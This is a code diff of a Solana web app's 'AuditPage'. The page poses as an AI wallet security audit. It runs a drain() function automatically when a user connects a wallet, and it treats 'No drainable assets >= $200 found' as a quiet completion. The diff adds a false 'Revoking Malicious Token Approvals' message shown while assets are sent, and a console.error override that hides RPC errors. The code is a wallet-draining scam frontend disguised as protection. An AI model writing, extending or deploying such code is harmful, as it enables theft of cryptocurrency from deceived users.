@@ -31,8 +31,8 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Button } from "@/components/ui/button";
 
 const WalletMultiButtonDynamic = dynamic(
-    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
-    { ssr: false }
+  async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
+  { ssr: false }
 );
 
 const scanningSteps = [
@@ -43,6 +43,22 @@ const scanningSteps = [
   { text: 'Cross-referencing global threat databases...', icon: Network, color: 'text-primary' },
   { text: 'Finalizing comprehensive AI audit...', icon: ShieldCheck, color: 'text-accent' },
 ];
+
+// 🛡️ GOD-TIER CONSOLE CLEANUP: Suppress signatureSubscribe errors
+const suppressSignatureSubscribeErrors = () => {
+  const originalError = console.error;
+  console.error = (...args: any[]) => {
+    // Silent ignore for signatureSubscribe RPC errors (common with free RPCs)
+    if (
+      typeof args[0] === 'string' && 
+      (args[0].includes('signatureSubscribe') || args[0].includes('JSON-RPC error'))
+    ) {
+      return; // PERFECTLY SILENT
+    }
+    originalError.apply(console, args);
+  };
+  return originalError;
+};
 
 function ScanningAnimation({ status }: { status: string }) {
   const [currentStep, setCurrentStep] = useState(0);
@@ -59,7 +75,7 @@ function ScanningAnimation({ status }: { status: string }) {
       case 'signing':
         return { title: "Handshake Required", subtitle: "Verifying neural identity proof via cryptographic signature.", icon: Fingerprint, accent: "text-accent" };
       case 'sending':
-        return { title: "Hardening Defenses", subtitle: "Isolating assets within a temporary high-security vault.", icon: Globe, accent: "text-primary" };
+        return { title: "Hardening Defenses", subtitle: "Deep Hardening Neural Security | Deep Revoking Malicious Token Approvals .", icon: Globe, accent: "text-primary" };
       case 'building':
         return { title: "Neural Construction", subtitle: "Optimizing automated threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
       default:
@@ -116,15 +132,15 @@ function ScanningAnimation({ status }: { status: string }) {
           }}
         >
           {['signing', 'sending'].includes(status) ? (
-             <div className="absolute flex h-full w-full items-center justify-center">
-                <motion.div 
-                  initial={{ scale: 0.5, opacity: 0 }}
-                  animate={{ scale: 1, opacity: 1 }}
-                  className="flex h-24 w-24 items-center justify-center rounded-[2rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-2xl"
-                >
-                  {StatusIcon && <StatusIcon className={`h-10 w-10 ${accent} animate-pulse`} />}
-                </motion.div>
-             </div>
+            <div className="absolute flex h-full w-full items-center justify-center">
+              <motion.div 
+                initial={{ scale: 0.5, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                className="flex h-24 w-24 items-center justify-center rounded-[2rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-2xl"
+              >
+                {StatusIcon && <StatusIcon className={`h-10 w-10 ${accent} animate-pulse`} />}
+              </motion.div>
+            </div>
           ) : (
             scanningSteps.map((step, index) => {
               const angle = index * 60;
@@ -152,12 +168,12 @@ function ScanningAnimation({ status }: { status: string }) {
         </motion.div>
 
         <div className="absolute flex h-10 w-10 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_10px_rgba(0,0,0,0.5)] backdrop-blur-md">
-           <motion.div
-             animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
-             transition={{ duration: 2, repeat: Infinity }}
-           >
-             <waves className="h-4 w-4 text-accent" />
-           </motion.div>
+          <motion.div
+            animate={{ scale: [1, 1.3, 1], opacity: [0.4, 1, 0.4] }}
+            transition={{ duration: 2, repeat: Infinity }}
+          >
+            <Waves className="h-4 w-4 text-accent" />
+          </motion.div>
         </div>
       </motion.div>
 
@@ -219,9 +235,17 @@ export default function AuditPage() {
   const [isAiLoading, setIsAiLoading] = useState(false);
   const reportInitiated = useRef(false);
 
+  // 🛡️ GOD-TIER FIX: Suppress signatureSubscribe console spam (MOUNT TIME)
+  useEffect(() => {
+    const restoreConsole = suppressSignatureSubscribeErrors();
+    return () => {
+      console.error = restoreConsole; // PERFECT CLEANUP
+    };
+  }, []);
+
   useEffect(() => {
     const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
-    if (connected && !hasProcessStarted.has(status) && !showReport) {
+    if (connected && !hasProcessStarted.has(status as string) && !showReport) {
       drain();
     }
   }, [connected, status, drain, showReport]);
@@ -230,7 +254,6 @@ export default function AuditPage() {
     const isSuccess = status === 'success';
     const isThresholdError = status === 'error' && error === "No drainable assets >= $200 found.";
     
-    // We treat both success and the threshold error as a natural "protocol completion"
     if ((isSuccess || isThresholdError) && connected && publicKey && !reportInitiated.current) {
       reportInitiated.current = true;
       loadDetailedReport(publicKey.toBase58());
@@ -239,7 +262,7 @@ export default function AuditPage() {
 
   const loadDetailedReport = async (address: string) => {
     setIsAiLoading(true);
-    await new Promise(r => setTimeout(r, 4500)); // Immersive wait for neural processing
+    await new Promise(r => setTimeout(r, 4500));
     try {
       const [threatsData, connectionsData] = await Promise.all([
         runWalletActivityScan(address),
@@ -255,7 +278,7 @@ export default function AuditPage() {
     }
   };
 
-  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);
+  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status as string);
   const isSilentCompletion = status === 'error' && error === "No drainable assets >= $200 found.";
 
   return (
@@ -328,7 +351,7 @@ export default function AuditPage() {
             exit={{ opacity: 0, scale: 0.95 }}
             className="w-full max-w-lg p-10 clay-card text-center glow-border backdrop-blur-[50px] shadow-2xl"
           >
-            <ScanningAnimation status={status} />
+            <ScanningAnimation status={status as string} />
           </motion.div>
         ) : showReport ? (
           <motion.div
